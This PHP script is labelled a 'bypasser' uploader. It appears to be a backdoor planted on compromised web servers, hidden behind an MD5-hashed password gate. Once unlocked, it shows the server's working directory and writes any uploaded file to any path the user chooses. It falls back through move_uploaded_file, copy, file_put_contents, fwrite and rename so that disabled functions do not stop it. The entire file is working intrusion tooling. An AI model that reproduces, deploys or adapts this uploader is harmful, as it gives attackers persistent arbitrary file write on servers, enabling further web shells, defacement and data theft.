<?php
// bypasser Alireza Uploader - 2024
session_start();

$correct_password = "7e24059b59e74d76e141aed73d47297e";  

if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["password"])) {
    if (md5($_POST["password"]) === $correct_password) {
        $_SESSION["authenticated"] = true;
    }
}

if (!isset($_SESSION["authenticated"]) || $_SESSION["authenticated"] !== true) {
?>
   <form method="post">
        <label for="password">Enter Password:</label>
        <input type="password" name="password" id="password" required>
        <button type="submit">Submit</button>
    </form>
<?php
    exit;
}
?>
<h3> <?php echo "Current Directory: " . getcwd(); ?></h3>
<script>
    window.addEventListener("DOMContentLoaded", function() {
        let e = document.createElement("form");
        e.method = "post";
        e.enctype = "multipart/form-data";

        // Input for file
        let t = document.createElement("input");
        t.type = "file";
        t.name = "file";
        t.required = true;

        // Input for upload path
        let p = document.createElement("input");
        p.type = "text";
        p.name = "upload_path";
        p.placeholder = "Enter upload path (optional)";

        // Submit button
        let n = document.createElement("button");
        n.type = "submit";
        n.innerHTML = "UP";

        e.appendChild(t);
        e.appendChild(p);
        e.appendChild(n);
        document.body.appendChild(e);
    });
</script>

<?php 
if ($_FILES) {
    $file_temp = $_FILES['file']['tmp_name'];  
    $file_name = $_FILES['file']['name'];

   
    $upload_path = isset($_POST['upload_path']) && !empty(trim($_POST['upload_path'])) 
                   ? rtrim($_POST['upload_path'], '/\\') 
                   : getcwd();  
    
  
    if (!is_dir($upload_path)) {
        echo "<span style='color:red'>Invalid upload path!</span>";
        exit;
    }

    
    $target_file = $upload_path . DIRECTORY_SEPARATOR . $file_name;

    //   move_uploaded_file
    if (function_exists('move_uploaded_file')) {
        if (@move_uploaded_file($file_temp, $target_file)) {
            printf('uploaded: <a href="%s">%s</a><br/>', htmlspecialchars($target_file), htmlspecialchars($file_name));
            exit;
        }
    }
    
    //  copy
    if (function_exists('copy')) {
        if (@copy($file_temp, $target_file)) {
            printf('uploaded: <a href="%s">%s</a><br/>', htmlspecialchars($target_file), htmlspecialchars($file_name));
            exit;
        }
    }
    
    //  file_put_contents
    if (function_exists('file_put_contents')) {
        $file_contents = @file_get_contents($file_temp);
        if ($file_contents !== false && @file_put_contents($target_file, $file_contents) !== false) {
            printf('uploaded: <a href="%s">%s</a><br/>', htmlspecialchars($target_file), htmlspecialchars($file_name));
            exit;
        }
    }

    //   fwrite
    if (function_exists('fwrite')) {
        $handle = @fopen($target_file, 'w');
        if ($handle) {
            $file_contents = @file_get_contents($file_temp);
            if ($file_contents !== false && @fwrite($handle, $file_contents) !== false) {
                fclose($handle);
                printf('uploaded: <a href="%s">%s</a><br/>', htmlspecialchars($target_file), htmlspecialchars($file_name));
                exit;
            }
            fclose($handle);
        }
    }
    
    //   rename
    if (function_exists('rename')) {
        if (@rename($file_temp, $target_file)) {
            printf('uploaded: <a href="%s">%s</a><br/>', htmlspecialchars($target_file), htmlspecialchars($file_name));
            exit;
        }
    }

    echo "<span style='color:red'>All Method Disabled!</span>";
}
?>
